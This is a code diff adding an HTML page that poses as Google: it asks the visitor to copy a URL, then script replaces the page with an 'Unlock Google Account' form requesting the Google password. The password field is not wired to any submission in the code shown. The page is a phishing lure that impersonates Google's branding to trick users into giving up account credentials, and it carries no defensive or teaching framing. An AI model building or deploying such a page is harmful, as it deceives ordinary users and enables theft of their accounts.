@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Google Login</title>
+    <style>
+      body {
+        font-family: 'Inter', Arial, sans-serif;
+        background-color: #f2f2f2;
+        margin: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #1e1e2f;
+      }
+
+      .card {
+        background-color: white;
+        max-width: 420px;
+        padding: 40px;
+        border-radius: 18px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
+        text-align: center;
+        transition: all 0.3s ease;
+      }
+
+      .google-logo {
+        width: 72px;
+        margin-bottom: 20px;
+      }
+
+      h2 {
+        font-size: 22px;
+        margin-bottom: 10px;
+      }
+
+      p {
+        font-size: 15px;
+        color: #555;
+        margin-bottom: 16px;
+      }
+
+      .url-box {
+        background: #e8f0fe;
+        padding: 12px;
+        border-radius: 8px;
+        font-family: monospace;
+        font-size: 14px;
+        color: #333;
+        word-break: break-word;
+        margin-bottom: 20px;
+      }
+
+      button {
+        background-color: #1a73e8;
+        color: white;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 10px;
+        font-size: 14px;
+        cursor: pointer;
+        font-weight: 500;
+        transition: background 0.2s ease;
+      }
+
+      button:hover {
+        background-color: #1558c0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card" id="card">
+      <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+      <h2>Connect with Google</h2>
+      <p>Copy and paste the URL below into your address bar:</p>
+      <div class="url-box" id="304url">https://google.com:1234</div>
+      <button onclick="copyUrl()">📋 Copy URL</button>
+    </div>
+
+    <script>
+      function copyUrl() {
+        const url = document.getElementById("304url");
+        const range = document.createRange();
+        const selection = window.getSelection();
+        range.selectNodeContents(url);
+        selection.removeAllRanges();
+        selection.addRange(range);
+        document.execCommand("copy");
+
+        setTimeout(() => {
+          document.body.innerHTML = `
+            <style>
+              body {
+                font-family: 'Inter', Arial, sans-serif;
+                background-color: #f2f2f2;
+                margin: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+              }
+
+              .login-container {
+                background: white;
+                padding: 40px;
+                border-radius: 18px;
+                box-shadow: 0 6px 28px rgba(0,0,0,0.08);
+                width: 320px;
+                text-align: center;
+              }
+
+              .google-logo {
+                width: 72px;
+                margin-bottom: 20px;
+              }
+
+              h2 {
+                margin: 10px 0;
+                font-size: 20px;
+              }
+
+              p {
+                color: #666;
+                margin-bottom: 20px;
+                font-size: 14px;
+              }
+
+              input[type="password"] {
+                width: 100%;
+                padding: 12px;
+                margin-bottom: 20px;
+                border: 1px solid #ccc;
+                border-radius: 8px;
+                font-size: 14px;
+                box-sizing: border-box;
+              }
+
+              button {
+                width: 100%;
+                padding: 12px;
+                background: #1a73e8;
+                color: white;
+                border: none;
+                border-radius: 8px;
+                font-weight: bold;
+                font-size: 14px;
+                cursor: pointer;
+              }
+
+              button:hover {
+                background: #1558c0;
+              }
+
+              .footer {
+                margin-top: 20px;
+                font-size: 11px;
+                color: #999;
+              }
+            </style>
+
+            <div class="login-container">
+              <img class="google-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+              <h2>Unlock Google Account</h2>
+              <p>Enter your Google password</p>
+              <input type="password" placeholder="Password" />
+              <button>Unlock</button>
+              <div class="footer">© Google LLC</div>
+            </div>
+          `;
+        }, 4300);
+      }
+    </script>
+  </body>
+</html>
